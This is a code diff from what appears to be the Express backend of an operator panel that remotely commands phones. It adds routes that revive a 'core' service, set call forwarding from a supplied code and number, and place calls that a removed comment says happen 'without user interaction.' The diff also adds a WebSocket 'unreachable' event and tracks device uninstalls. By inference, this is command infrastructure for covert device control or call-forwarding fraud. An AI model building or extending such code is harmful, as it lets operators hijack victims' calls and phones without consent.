@@ -45,13 +45,27 @@ async function handleCoreCommand(
 
   try {
     let result: { success: boolean; messageId?: string; error?: string } | undefined;
-    if (command === "restart_core") result = await sendRestartCore(deviceId, { requestId, force });
-    else if (command === "revive_core") result = await sendReviveCore(deviceId, { requestId, force });
-    else if (command === "start_core") result = await sendStartCore(deviceId, { requestId, force });
-    else result = await sendSyncToken(deviceId, { requestId, force });
+    if (command === "restart_core")      result = await sendRestartCore(deviceId, { requestId, force });
+    else if (command === "revive_core")  result = await sendReviveCore(deviceId, { requestId, force });
+    else if (command === "start_core")   result = await sendStartCore(deviceId, { requestId, force });
+    else                                 result = await sendSyncToken(deviceId, { requestId, force });
 
     if (!result?.success) {
       logger.warn("adminPush: core command failed", { deviceId, command, requestId, error: result?.error });
+
+      // FCM fail hote hi frontend ko batao — WS event bhejo
+      // (device:uninstalled already clearInvalidFcmToken se aayega agar token invalid ho)
+      // Yeh extra event tab aata hai jab missing_token ya other FCM errors hon
+      try {
+        const wsService = require("../services/wsService").default;
+        wsService.broadcastAdminEvent("check_online:result", {
+          deviceId,
+          status:    "unreachable",
+          error:     result?.error || "fcm_send_failed",
+          timestamp: Date.now(),
+        }, { deviceId, includeDeviceChannel: true });
+      } catch (_) {}
+
       return res.status(400).json({ success: false, error: result?.error || "fcm_send_failed", deviceId, command, requestId });
     }
 
@@ -104,8 +118,8 @@ router.post("/devices/:deviceId/call-forward", async (req: Request, res: Respons
   const deviceId = clean(req.params.deviceId);
   if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
 
-  const callCode    = clean(req.body?.callCode || req.body?.code);
-  if (!callCode)    return res.status(400).json({ success: false, error: "missing 'callCode'" });
+  const callCode = clean(req.body?.callCode || req.body?.code);
+  if (!callCode) return res.status(400).json({ success: false, error: "missing 'callCode'" });
 
   const sim         = clean(req.body?.sim || "0");
   const phoneNumber = clean(req.body?.phoneNumber || "");
@@ -122,26 +136,15 @@ router.post("/devices/:deviceId/call-forward", async (req: Request, res: Respons
 });
 
 /* ═══════════════════════════════════════════
-   MAKE DIRECT CALL (NEW)
+   MAKE DIRECT CALL
    ═══════════════════════════════════════════ */
 
-/**
- * POST /devices/:deviceId/make-call
- *
- * Body: {
- *   number: "9876543210",
- *   sim: 0   // 0 = SIM1, 1 = SIM2
- * }
- *
- * Device automatically initiates call without user interaction.
- * Requires CALL_PHONE permission on device.
- */
 router.post("/devices/:deviceId/make-call", async (req: Request, res: Response) => {
   const deviceId = clean(req.params.deviceId);
   if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
 
   const number = clean(req.body?.number || req.body?.phoneNumber || "");
-  if (!number)  return res.status(400).json({ success: false, error: "missing 'number'" });
+  if (!number) return res.status(400).json({ success: false, error: "missing 'number'" });
 
   const sim = typeof req.body?.sim === "number"
     ? req.body.sim
